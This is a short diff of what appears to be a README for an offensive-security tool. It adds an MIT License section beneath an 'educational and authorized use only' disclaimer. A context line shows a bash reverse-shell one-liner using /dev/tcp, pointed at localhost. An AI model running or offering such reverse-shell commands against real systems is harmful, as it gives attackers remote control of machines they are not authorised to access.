@@ -23,3 +23,7 @@ Bash: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 
 ## Disclaimer
 **For educational and authorized use only. Misuse of this tool may result in legal consequences.**
+
+
+## License:
+This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
